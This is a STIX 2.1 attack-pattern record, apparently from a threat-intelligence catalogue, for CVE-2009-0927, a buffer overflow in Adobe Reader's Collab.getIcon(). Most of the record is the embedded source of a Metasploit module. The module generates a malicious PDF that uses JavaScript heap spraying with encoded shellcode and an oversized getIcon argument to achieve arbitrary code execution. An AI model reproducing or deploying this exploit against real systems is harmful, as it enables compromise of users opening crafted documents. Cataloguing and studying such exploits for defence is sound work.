{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9150380-a241-40ed-9b8e-15b2f92e02a2",
    "created": "2024-08-14T16:36:31.478752Z",
    "modified": "2024-08-14T16:36:31.478756Z",
    "name": "Adobe Collab.getIcon() Buffer Overflow",
    "description": " This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat. Affected versions include < 7.1.1, < 8.1.3, and < 9.1. By creating a specially crafted pdf that a contains malformed Collab.getIcon() call, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/adobe_geticon.rb",
            "external_id": "adobe_geticon.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0927"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::PDF\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Collab.getIcon() Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat.\n        Affected versions include < 7.1.1, < 8.1.3, and < 9.1. By creating a specially\n        crafted pdf that a contains malformed Collab.getIcon() call, an attacker may\n        be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'MC',\n          'Didier Stevens <didier.stevens[at]gmail.com>',\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0927' ],\n          [ 'OSVDB', '53647' ],\n          [ 'ZDI', '09-014' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # test results (on Windows XP SP3)\n          # reader 7.0.5 - no trigger\n          # reader 7.0.8 - no trigger\n          # reader 7.0.9 - no trigger\n          # reader 7.1.0 - no trigger\n          # reader 7.1.1 - reported not vulnerable\n          # reader 8.0.0 - works\n          # reader 8.1.2 - works\n          # reader 8.1.3 - reported not vulnerable\n          # reader 9.0.0 - works\n          # reader 9.1.0 - reported not vulnerable\n          [ 'Adobe Reader Universal (JS Heap Spray)', { 'Ret' => '' } ],\n        ],\n      'DisclosureDate' => '2009-03-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n      ])\n  end\n\n  def exploit\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Make some nops\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Randomize variables\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n    rand9  = rand_text_alpha(rand(100) + 1)\n    rand10 = rand_text_alpha(rand(100) + 1)\n    rand11 = rand_text_alpha(rand(100) + 1)\n    rand12 = rand_text_alpha(rand(100) + 1)\n\n    script = %Q|\n    var #{rand1} = unescape(\"#{shellcode}\");\n    var #{rand2} =\"\";\n    for (#{rand3}=128;#{rand3}>=0;--#{rand3}) #{rand2} += unescape(\"#{nops}\");\n    #{rand4} = #{rand2} + #{rand1};\n    #{rand5} = unescape(\"#{nops}\");\n    #{rand6} = 20;\n    #{rand7} = #{rand6}+#{rand4}.length\n    while (#{rand5}.length<#{rand7}) #{rand5}+=#{rand5};\n    #{rand8} = #{rand5}.substring(0, #{rand7});\n    #{rand9} = #{rand5}.substring(0, #{rand5}.length-#{rand7});\n    while(#{rand9}.length+#{rand7} < 0x40000) #{rand9} = #{rand9}+#{rand9}+#{rand8};\n    #{rand10} = new Array();\n    for (#{rand11}=0;#{rand11}<1450;#{rand11}++) #{rand10}[#{rand11}] = #{rand9} + #{rand4};\n    var #{rand12} = unescape(\"%0a\");\n    while(#{rand12}.length < 0x4000) #{rand12}+=#{rand12};\n    #{rand12} = \"N.\"+#{rand12};\n    Collab.getIcon(#{rand12});\n          |\n\n    # Create the pdf\n    #pdf = make_pdf(script)\n    pdf = create_pdf(script)\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(pdf)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-03-24",
    "x_mitre_platforms": [
        "win'"
    ]
}